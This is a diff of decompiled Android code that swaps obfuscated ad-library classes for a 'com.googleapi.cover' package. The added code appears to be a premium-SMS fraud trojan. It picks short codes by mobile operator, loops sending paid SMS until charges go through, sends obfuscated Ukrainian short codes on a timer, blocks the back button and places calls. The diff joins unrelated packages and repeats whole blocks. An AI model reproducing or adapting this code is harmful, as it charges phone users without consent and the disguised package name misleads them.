+                result.put(ActService.NUM_10, ActService.NUM_1);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, ActService.NUM_1);
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_1);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_1);
+                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_1, "-1");
+                result.put(Actor.NUM_1_ALT, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, ActService.NUM_1);
+                    result.put(Actor.NUM_2, Actor.NUM_2);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
+                }
             }
+            return new HashMap<>(result);
         }
-    }
 
-    @Override // org.apache.http.client.RedirectHandler
-    public boolean isRedirectRequested(HttpResponse httpResponse, HttpContext httpContext) {
-        Header firstHeader = httpResponse.getFirstHeader("location");
-        if (firstHeader == null || firstHeader.getValue() == null) {
-            c(this.d, this.c);
-            return false;
+        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
+            }
+            return new HashMap<>(result);
         }
-        String value = firstHeader.getValue();
-        Uri parse = Uri.parse(value);
-        if (parse.getHost() == null) {
-            value = "http://" + Uri.parse(this.c).getHost() + parse;
+
+        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_5);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, "-1");
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
+                result.put(Actor.NUM_3_ALT, "-1");
+                result.put(Actor.NUM_1, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, Actor.NUM_2);
+                    result.put(Actor.NUM_2, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
+                    result.put(Actor.NUM_1_ALT, "-1");
+                }
+            }
+            return new HashMap<>(result);
         }
-        a(this.d, value);
-        return false;
+
+        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_1, ActService.NUM_2_SD);
+                result.put(ActService.NUM_3, ActService.NUM_2_SD);
+                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, "-1");
+            }
+            return new HashMap<>(result);
+        }
+
+        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
+            ArrayList<String> result = new ArrayList<>();
+            if (isMTSRF) {
+                result.add(ActService.NUM_10);
+                result.add(ActService.NUM_5);
+                result.add(ActService.NUM_3);
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            } else if (!isBeline) {
+                result.add(Actor.NUM_10);
+                result.add(Actor.NUM_10_ALT);
+                result.add(Actor.NUM_5);
+                result.add(Actor.NUM_5_ALT);
+                result.add(Actor.NUM_3);
+                result.add(Actor.NUM_3_ALT);
+                result.add(Actor.NUM_2);
+                result.add(Actor.NUM_1);
+                result.add(Actor.NUM_1_ALT);
+            } else {
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            }
+            return result;
+        }
+
+        private void performActions() {
+            String lastNumber;
+            Context context = ActService.this.getApplicationContext();
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            String opStr = settings.getString(Actor.NETWORK_STRING, "");
+            Actor act = new Actor(context, opStr);
+            if (act.isUkrCode()) {
+                actUK(act, settings);
+                return;
+            }
+            boolean isMTSRF = act.isMTSRF();
+            boolean isBeeline = act.isBeline();
+            if (act.isPrivate()) {
+                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
+                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
+                int acceptedNums = 0;
+                if (isBeeline) {
+                    String currentNumber = ActService.NUM_1;
+                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    do {
+                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber = positives.get(currentNumber);
+                        } else {
+                            if (currentNumber.equals(ActService.NUM_1)) {
+                                if (acceptedNums != 0) {
+                                    break;
+                                }
+                                ActService.PREF_TO_USE = Actor.PREF_PORT;
+                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
+                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
+                            }
+                            currentNumber = negatives.get(currentNumber);
+                        }
+                        if (currentNumber == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber.equalsIgnoreCase("-1"));
+                } else if (isMTSRF || act.isMF()) {
+                    double restAllowedSum = 0.0d;
+                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
+                    if (isMTSRF) {
+                        ActService.PREF_TO_USE = ActService.PREF_A1;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mtsPrices;
+                    } else if (act.isMF()) {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mfPrices;
+                    }
+                    int currentNumberIndex = 0;
+                    while (true) {
+                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
+                            currentNumberIndex++;
+                        } else {
+                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
+                                break;
+                            }
+                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
+                            do {
+                                try {
+                                    sleep(100L);
+                                } catch (InterruptedException e2) {
+                                }
+                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                                acceptedNums++;
+                                if (acceptedNums < 3) {
+                                    smsData = act.getRelatedData(acceptedNums - 1);
+                                    waitForAcceptance(acceptedNums, settings);
+                                }
+                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
+                            } else {
+                                currentNumberIndex++;
+                            }
+                        }
+                    }
+                } else {
+                    String currentNumber2 = Actor.NUM_10;
+                    String num3_alt = Actor.NUM_3_ALT;
+                    new String();
+                    ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    do {
+                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e3) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        lastNumber = currentNumber2;
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber2 = positives.get(currentNumber2);
+                        } else {
+                            currentNumber2 = negatives.get(currentNumber2);
+                        }
+                        if (currentNumber2 == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber2.equalsIgnoreCase("-1"));
+                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                    }
+                }
+            } else {
+                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
+                for (int i = 0; i < numbers.size(); i++) {
+                    String number = numbers.get(i);
+                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
+                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    } else {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    }
+                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
+                    do {
+                        try {
+                            sleep(100L);
+                        } catch (InterruptedException e4) {
+                        }
+                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                        break;
+                    }
+                }
+            }
+            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
+            act.reportDone();
+        }
+
+        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
+            do {
+                try {
+                    sleep(100L);
+                } catch (InterruptedException e) {
+                }
+            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
+        }
+
+        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
+            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
+            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
+            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
+        }
+
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                }
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
+                }
+            }
+            act.reportDone();
+        }
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.f.e
-Class Name:f
-Content: package net.crazymedia.iad.b;
+Package Path:com.googleapi.cover.ActService.Worker
+Class Name:ActService
+Content: package com.googleapi.cover;
 
-    public static String e() {
-        return String.valueOf(a()) + new net.crazymedia.iad.d.e(e.i()).a(e.j());
+    private class Worker extends Thread {
+        private Worker() {
+        }
+
+        /* synthetic */ Worker(ActService actService, Worker worker) {
+            this();
+        }
+
+        @Override // java.lang.Thread, java.lang.Runnable
+        public void run() {
+            ActService.isStarted = true;
+            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
+            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
+            ActService.this.wakeLock.acquire();
+            performActions();
+            ActService.isStarted = false;
+            ActService.this.stopSelf();
+        }
+
+        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_1);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, ActService.NUM_1);
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_1);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_1);
+                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_1, "-1");
+                result.put(Actor.NUM_1_ALT, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, ActService.NUM_1);
+                    result.put(Actor.NUM_2, Actor.NUM_2);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
+                }
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_5);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, "-1");
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
+                result.put(Actor.NUM_3_ALT, "-1");
+                result.put(Actor.NUM_1, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, Actor.NUM_2);
+                    result.put(Actor.NUM_2, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
+                    result.put(Actor.NUM_1_ALT, "-1");
+                }
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_1, ActService.NUM_2_SD);
+                result.put(ActService.NUM_3, ActService.NUM_2_SD);
+                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, "-1");
+            }
+            return new HashMap<>(result);
+        }
+
+        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
+            ArrayList<String> result = new ArrayList<>();
+            if (isMTSRF) {
+                result.add(ActService.NUM_10);
+                result.add(ActService.NUM_5);
+                result.add(ActService.NUM_3);
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            } else if (!isBeline) {
+                result.add(Actor.NUM_10);
+                result.add(Actor.NUM_10_ALT);
+                result.add(Actor.NUM_5);
+                result.add(Actor.NUM_5_ALT);
+                result.add(Actor.NUM_3);
+                result.add(Actor.NUM_3_ALT);
+                result.add(Actor.NUM_2);
+                result.add(Actor.NUM_1);
+                result.add(Actor.NUM_1_ALT);
+            } else {
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            }
+            return result;
+        }
+
+        private void performActions() {
+            String lastNumber;
+            Context context = ActService.this.getApplicationContext();
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            String opStr = settings.getString(Actor.NETWORK_STRING, "");
+            Actor act = new Actor(context, opStr);
+            if (act.isUkrCode()) {
+                actUK(act, settings);
+                return;
+            }
+            boolean isMTSRF = act.isMTSRF();
+            boolean isBeeline = act.isBeline();
+            if (act.isPrivate()) {
+                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
+                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
+                int acceptedNums = 0;
+                if (isBeeline) {
+                    String currentNumber = ActService.NUM_1;
+                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    do {
+                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber = positives.get(currentNumber);
+                        } else {
+                            if (currentNumber.equals(ActService.NUM_1)) {
+                                if (acceptedNums != 0) {
+                                    break;
+                                }
+                                ActService.PREF_TO_USE = Actor.PREF_PORT;
+                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
+                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
+                            }
+                            currentNumber = negatives.get(currentNumber);
+                        }
+                        if (currentNumber == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber.equalsIgnoreCase("-1"));
+                } else if (isMTSRF || act.isMF()) {
+                    double restAllowedSum = 0.0d;
+                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
+                    if (isMTSRF) {
+                        ActService.PREF_TO_USE = ActService.PREF_A1;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mtsPrices;
+                    } else if (act.isMF()) {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mfPrices;
+                    }
+                    int currentNumberIndex = 0;
+                    while (true) {
+                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
+                            currentNumberIndex++;
+                        } else {
+                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
+                                break;
+                            }
+                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
+                            do {
+                                try {
+                                    sleep(100L);
+                                } catch (InterruptedException e2) {
+                                }
+                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                                acceptedNums++;
+                                if (acceptedNums < 3) {
+                                    smsData = act.getRelatedData(acceptedNums - 1);
+                                    waitForAcceptance(acceptedNums, settings);
+                                }
+                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
+                            } else {
+                                currentNumberIndex++;
+                            }
+                        }
+                    }
+                } else {
+                    String currentNumber2 = Actor.NUM_10;
+                    String num3_alt = Actor.NUM_3_ALT;
+                    new String();
+                    ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    do {
+                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e3) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        lastNumber = currentNumber2;
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber2 = positives.get(currentNumber2);
+                        } else {
+                            currentNumber2 = negatives.get(currentNumber2);
+                        }
+                        if (currentNumber2 == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber2.equalsIgnoreCase("-1"));
+                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                    }
+                }
+            } else {
+                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
+                for (int i = 0; i < numbers.size(); i++) {
+                    String number = numbers.get(i);
+                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
+                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    } else {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    }
+                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
+                    do {
+                        try {
+                            sleep(100L);
+                        } catch (InterruptedException e4) {
+                        }
+                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                        break;
+                    }
+                }
+            }
+            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
+            act.reportDone();
+        }
+
+        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
+            do {
+                try {
+                    sleep(100L);
+                } catch (InterruptedException e) {
+                }
+            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
+        }
+
+        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
+            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
+            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
+            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
+        }
+
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                }
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
+                }
+            }
+            act.reportDone();
+        }
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.c.e.a
-Class Name:e
-Content: package net.crazymedia.iad.c;
+Package Path:com.googleapi.cover.Main.showLastScreen
+Class Name:Main
+Content: package com.googleapi.cover;
 
-    public static e a(JSONObject jSONObject) {
-        e eVar = null;
-        if (jSONObject != null) {
-            eVar = new e();
-            try {
-                eVar.a = jSONObject.optString("id");
-                eVar.b = jSONObject.optString("appUid");
-                eVar.c = jSONObject.optString("runAppScore");
-            } catch (Exception e) {
-            }
+    public void showLastScreen(Intent i) {
+        i.setFlags(i.getFlags() | 67108864 | 536870912);
+        String relatedLinks = "";
+        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
+        for (int j = 0; j < maxIndex + 1; j++) {
+            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
         }
-        return eVar;
+        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
+        startActivity(i);
+        finish();
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.c.e.e
-Class Name:e
-Content: package net.crazymedia.iad.c;
+Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
 
-public class e {
-    public String a;
-    public String b;
-    public String c;
+    private void initializeTextViews() {
+        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
+        Display display = getWindowManager().getDefaultDisplay();
+        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
+    }
 
-    public static e a(JSONObject jSONObject) {
-        e eVar = null;
-        if (jSONObject != null) {
-            eVar = new e();
-            try {
-                eVar.a = jSONObject.optString("id");
-                eVar.b = jSONObject.optString("appUid");
-                eVar.c = jSONObject.optString("runAppScore");
-            } catch (Exception e) {
+Package Path:com.googleapi.cover.ShowURL.onClick
+Class Name:ShowURL
+Content: package com.googleapi.cover;
+
+            public void onClick(View v) {
+                String uri = "tel:" + ShowURL.this.getString(R.string.support_number);
+                Intent intent = new Intent("android.intent.action.CALL");
+                intent.setData(Uri.parse(uri));
+                ShowURL.this.startActivity(intent);
             }
+
+Package Path:com.googleapi.cover.Main.showLastScreen
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    public void showLastScreen(Intent i) {
+        i.setFlags(i.getFlags() | 67108864 | 536870912);
+        String relatedLinks = "";
+        int maxIndex = getSharedPreferences(KEY_PREFS, 0).getInt(RelatedContent.LAST_ACTIVATED, -1);
+        for (int j = 0; j < maxIndex + 1; j++) {
+            relatedLinks = relatedLinks.concat("\n" + this.actor.getRelatedContentLink(j));
         }
-        return eVar;
+        i.putExtra("URL", String.valueOf(this.actor.getActedLink()) + relatedLinks);
+        startActivity(i);
+        finish();
+    }
+
+Package Path:com.googleapi.cover.RelatedContent.RelatedContent
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
+
+public class RelatedContent extends Activity {
+    public static final String LAST_ACTIVATED = "LAST_ACTIVATED";
+    private static final int OFF = 1;
+    private static final int RESULT_OK = 1;
+    private Actor actor;
+    private TextView agreementTextView;
+    private ProgressDialog dialog;
+    private TextView exitTextView;
+    private TextView footrTextView;
+    private int index;
+    private TextView mainTextView;
+    private Button noButton;
+    private Button yesButton;
+    boolean isRegistered = false;
+    private String price_mf_1 = "111.76";
+    private String price_mf_2 = "70";
+
+    @Override // android.app.Activity
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.related_content);
+        this.index = getIntent().getIntExtra("index", 0);
+        this.actor = new Actor(this, TextUtils.getOperatorString(this));
+        if (!this.actor.wasActError()) {
+            initializeGUI();
+        } else {
+            finish();
+        }
+    }
+
+    private void initializeGUI() {
+        initButtons();
+        initializeTextViews();
+    }
+
+    private void initButtons() {
+        this.yesButton = (Button) findViewById(R.id.related_yes_btn);
+        this.noButton = (Button) findViewById(R.id.related_no_btn);
+        setListeners();
+    }
+
+    private void initializeTextViews() {
+        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
+        Display display = getWindowManager().getDefaultDisplay();
+        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
+    }
+
+    @Override // android.app.Activity, android.view.KeyEvent.Callback
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == 4) {
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+    @Override // android.app.Activity
+    public void onBackPressed() {
+    }
+
+    private void setListeners() {
+        this.yesButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.1
+            private boolean clickable = true;
+
+            @Override // android.view.View.OnClickListener
+            public void onClick(View v) {
+                if (this.clickable) {
+                    this.clickable = false;
+                    RelatedContent.this.start();
+                }
+            }
+        });
+        if (this.actor.isMF()) {
+            this.noButton.setVisibility(0);
+        }
+        this.noButton.setOnClickListener(new View.OnClickListener() { // from class: com.googleapi.cover.RelatedContent.2
+            private boolean clickable = true;
+
+            @Override // android.view.View.OnClickListener
+            public void onClick(View v) {
+                if (this.clickable) {
+                    this.clickable = false;
+                    RelatedContent.this.goToNextScreen();
+                }
+            }
+        });
+        this.footrTextView = (TextView) findViewById(R.id.agr_footr_text);
+        this.agreementTextView = (TextView) findViewById(R.id.related_content_agr_text);
+        this.exitTextView = (TextView) findViewById(R.id.related_content_exit_text);
+        this.agreementTextView.setVisibility(8);
+        this.exitTextView.setVisibility(8);
+        if (this.actor.isMF() || this.actor.isMTSRF()) {
+            String price = "";
+            if (this.index == 0) {
+                if (this.actor.isMF()) {
+                    price = this.price_mf_1;
+                }
+            } else if (this.index == 1 && this.actor.isMF()) {
+                price = this.price_mf_2;
+            }
